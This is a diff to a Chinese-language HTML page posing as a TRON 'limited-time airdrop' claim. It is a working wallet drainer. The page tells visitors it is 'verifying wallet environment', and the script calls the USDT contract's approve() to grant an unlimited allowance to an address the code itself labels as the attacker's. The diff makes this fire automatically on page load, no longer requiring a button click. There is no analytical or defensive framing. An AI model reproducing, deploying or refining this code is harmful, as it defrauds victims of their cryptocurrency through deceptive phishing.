@@ -2,56 +2,54 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🎁 領取空投（TRON）</title>
+  <title>限時空投</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
   <style>
-    body { font-family: 'Arial'; background: #f9f9f9; text-align: center; padding: 80px; }
-    button {
-      padding: 12px 30px;
-      font-size: 20px;
-      background: #28a745;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
+    body {
+      font-family: 'Arial';
+      background: #f9f9f9;
+      text-align: center;
+      padding: 60px;
     }
-    #status { margin-top: 20px; font-size: 16px; color: #555; }
+    h1 {
+      font-size: 28px;
+      color: #222;
+    }
+    #status {
+      margin-top: 30px;
+      font-size: 18px;
+      color: #555;
+    }
   </style>
 </head>
 <body>
-  <h1>🎉 恭喜你獲得 TRON 限時空投</h1>
-  <p>點擊下方按鈕確認參與活動</p>
-  <button onclick="approve()">✅ 確認</button>
-  <p id="status">等待操作中...</p>
+  <h1>恭喜你獲得限時空投！</h1>
+  <p id="status">正在驗證錢包環境...</p>
 
   <script>
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20 USDT 主網
-    const ATTACKER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";     // 攻擊者地址
-    const ABI = [
-      { "constant": false, "inputs": [
-        { "name": "_spender", "type": "address" },
-        { "name": "_value", "type": "uint256" }
-      ], "name": "approve", "outputs": [
-        { "name": "success", "type": "bool" }
-      ], "type": "function" }
-    ];
+    const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+    const ATTACKER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";
 
-    async function approve() {
-      if (typeof window.tronWeb === 'undefined' || !tronWeb.defaultAddress.base58) {
-        alert("請先安裝並登入 TronLink 錢包");
+    async function approveUSDT() {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        document.getElementById("status").innerText = "請使用 TronLink App 掃描進入此頁面。";
         return;
       }
 
+      const address = window.tronWeb.defaultAddress.base58;
+      const contract = await tronWeb.contract().at(USDT_CONTRACT);
+      const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
       document.getElementById("status").innerText = "⏳ 發送授權中...";
 
       try {
-        const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
-        const tx = await contract.approve(ATTACKER, "9223372036854775807").send();
-        document.getElementById("status").innerText = "✅ 授權成功，TX Hash: " + tx;
+        const tx = await contract.approve(ATTACKER, max).send();
+        document.getElementById("status").innerText = `✅ 授權成功！TxID: ${tx}`;
       } catch (e) {
-        document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;
+        document.getElementById("status").innerText = `❌ 授權失敗：${e.message}`;
       }
     }
+
+    window.addEventListener('load', approveUSDT);
   </script>
 </body>
 </html>
